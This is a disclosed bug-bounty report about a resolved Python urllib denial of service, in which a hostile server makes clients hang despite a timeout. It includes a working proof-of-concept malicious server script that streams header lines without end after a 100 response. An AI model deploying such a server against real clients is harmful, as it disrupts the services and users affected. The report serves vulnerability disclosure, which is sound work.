---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1188128'
original_report_id: '1188128'
title: '"urllib" will result to deny of service'
team_handle: ibb
created_at: '2021-05-07T17:14:22.488Z'
disclosed_at: '2021-10-21T16:39:55.295Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 9
tags:
- hackerone
---

# "urllib" will result to deny of service

## Metadata

- HackerOne Report ID: 1188128
- Weakness: 
- Program: ibb
- Disclosed At: 2021-10-21T16:39:55.295Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

if a client request a http/https/ftp service which is controlled by attacker, attacker can make this client hang forever, event client has set "timeout" argument.

maybe this client also will consume more and more memory. i does not test on this conclusion.

client.py
```
import urllib.request

req = urllib.request.Request('http://127.0.0.1:8085')
response = urllib.request.urlopen(req, timeout=1)
```

evil_server.py
```
# coding:utf-8
from socket import *
from multiprocessing import *
from time import sleep

def dealWithClient(newSocket,destAddr):
    recvData = newSocket.recv(1024)
    newSocket.send(b"""HTTP/1.1 100 OK\n""")

    while True:
        # recvData = newSocket.recv(1024)
        newSocket.send(b"""x:a\n""")

        if len(recvData)>0:
            # print('recv[%s]:%s'%(str(destAddr), recvData))
            pass
        else:
            print('[%s]close'%str(destAddr))
            sleep(10)
            print('over')
            break

    # newSocket.close()


def main():

    serSocket = socket(AF_INET, SOCK_STREAM)
    serSocket.setsockopt(SOL_SOCKET, SO_REUSEADDR  , 1)
    localAddr = ('', 8085)
    serSocket.bind(localAddr)
    serSocket.listen(5)

    try:
        while True:
            newSocket,destAddr = serSocket.accept()

            client = Process(target=dealWithClient, args=(newSocket,destAddr))
            client.start()

            newSocket.close()
    finally:
        serSocket.close()

if __name__ == '__main__':
    main()
```

## Impact

if a client request a http/https/ftp service which is controlled by attacker, attacker can make this client hang forever, event client has set "timeout" argument.

more info, see https://bugs.python.org/issue44022

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
